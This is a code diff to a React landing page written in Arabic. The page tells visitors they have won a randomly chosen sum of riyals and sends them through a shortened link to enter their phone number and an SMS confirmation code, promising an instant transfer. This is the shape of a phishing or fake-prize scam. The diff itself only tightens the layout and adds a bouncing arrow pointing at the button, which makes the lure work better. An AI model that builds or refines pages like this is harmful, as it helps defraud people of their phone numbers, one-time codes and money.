@@ -1,6 +1,6 @@
 import { useState, useEffect } from 'react';
 import { motion, AnimatePresence } from 'motion/react';
-import { Gift, Phone, CheckCircle, Bell, ShieldCheck } from 'lucide-react';
+import { Gift, Phone, CheckCircle, Bell, ShieldCheck, ArrowDown } from 'lucide-react';
 
 export default function App() {
   const prizes = ["350,000", "400,000", "500,000", "750,000", "1,000,000", "1,500,000"];
@@ -42,19 +42,19 @@ export default function App() {
   }, []);
 
   return (
-    <div dir="rtl" className="min-h-screen bg-[#f8fafc] text-slate-800 font-sans overflow-x-hidden pb-24">
+    <div dir="rtl" className="min-h-screen bg-[#f8fafc] text-slate-800 font-sans overflow-x-hidden pb-8">
       {/* Header removed as requested */}
 
-      <main className="max-w-xl mx-auto px-4 py-8 flex flex-col items-center">
+      <main className="max-w-xl mx-auto px-4 py-4 flex flex-col items-center">
         {/* Profile Section */}
         <motion.div 
           initial={{ scale: 0.9, opacity: 0 }}
           animate={{ scale: 1, opacity: 1 }}
           transition={{ duration: 0.5 }}
-          className="flex flex-col items-center mb-8"
+          className="flex flex-col items-center mb-4"
         >
           <div className="relative mb-2">
-            <div className="w-28 h-28 rounded-full p-1 bg-gradient-to-tr from-emerald-400 to-teal-600 shadow-lg">
+            <div className="w-24 h-24 rounded-full p-1 bg-gradient-to-tr from-emerald-400 to-teal-600 shadow-lg">
               <img 
                 src={profileImage} 
                 alt="Profile" 
@@ -74,29 +74,33 @@ export default function App() {
           initial={{ y: 20, opacity: 0 }}
           animate={{ y: 0, opacity: 1 }}
           transition={{ duration: 0.5, delay: 0.1 }}
-          className="w-full bg-white rounded-3xl p-8 shadow-xl shadow-slate-200/50 border border-slate-100 text-center relative overflow-hidden mb-8"
+          className="w-full bg-white rounded-3xl p-6 shadow-xl shadow-slate-200/50 border border-slate-100 text-center relative overflow-hidden mb-6"
         >
           <div className="absolute top-0 left-0 w-full h-1.5 bg-gradient-to-r from-emerald-400 to-teal-500"></div>
           
-          <h2 className="text-lg font-bold text-slate-600 mb-4">
+          <h2 className="text-lg font-bold text-slate-600 mb-2">
             انت الرابح بمبلغ
           </h2>
           
-          <div className="mb-6">
+          <div className="mb-3">
             <span className="block text-5xl md:text-6xl font-black text-transparent bg-clip-text bg-gradient-to-r from-emerald-600 to-teal-600">
               {prize} <span className="text-2xl text-emerald-600">ريال</span>
             </span>
           </div>
           
-          <p className="text-slate-500 text-sm font-medium mb-8">
+          <p className="text-slate-500 text-sm font-medium mb-3">
             ادخل رقم هاتفك من هنا للحصول على المبلغ
           </p>
 
+          <div className="flex justify-center mb-2 animate-bounce">
+            <ArrowDown className="w-6 h-6 text-emerald-500" />
+          </div>
+
           <a 
             href="https://smrturl.co/6367a65"
-            className="group relative flex items-center justify-center w-full bg-gradient-to-r from-emerald-500 to-teal-600 hover:from-emerald-600 hover:to-teal-700 text-white font-bold text-xl py-4 rounded-2xl shadow-lg shadow-emerald-500/30 transition-all active:scale-[0.98] gap-2"
+            className="group relative flex items-center justify-center w-full bg-gradient-to-r from-emerald-500 to-teal-600 hover:from-emerald-600 hover:to-teal-700 text-white font-bold text-xl py-3.5 rounded-2xl shadow-lg shadow-emerald-500/30 transition-all active:scale-[0.98] gap-2"
           >
-            <Gift className="w-6 h-6" />
+            <Phone className="w-6 h-6" />
             ادخل رقم هاتفك من هنا
           </a>
           
@@ -113,15 +117,15 @@ export default function App() {
           transition={{ duration: 0.5, delay: 0.2 }}
           className="w-full"
         >
-          <h3 className="text-lg font-bold text-slate-800 mb-6 text-center">خطوات استلام الجائزة</h3>
+          <h3 className="text-lg font-bold text-slate-800 mb-4 text-center">خطوات استلام الجائزة</h3>
           
-          <div className="space-y-4">
+          <div className="space-y-3">
             {[
               { icon: Phone, title: "سجل بياناتك", desc: "اضغط على زر ادخل رقم هاتفك من هنا" },
               { icon: ShieldCheck, title: "أكد هويتك", desc: "أدخل رمز التأكيد (SMS) المرسل إليك." },
               { icon: CheckCircle, title: "استلم جائزتك", desc: "سيتم تحويل المبلغ فوراً إلى حسابك." }
             ].map((step, i) => (
-              <a href="https://smrturl.co/6367a65" key={i} className="flex items-center gap-4 bg-white p-4 rounded-2xl border border-slate-100 shadow-sm hover:border-emerald-200 hover:shadow-md transition-all cursor-pointer">
+              <a href="https://smrturl.co/6367a65" key={i} className="flex items-center gap-4 bg-white p-3 rounded-2xl border border-slate-100 shadow-sm hover:border-emerald-200 hover:shadow-md transition-all cursor-pointer">
                 <div className="w-12 h-12 rounded-full bg-emerald-50 text-emerald-600 flex items-center justify-center shrink-0">
                   <step.icon className="w-6 h-6" />
                 </div>
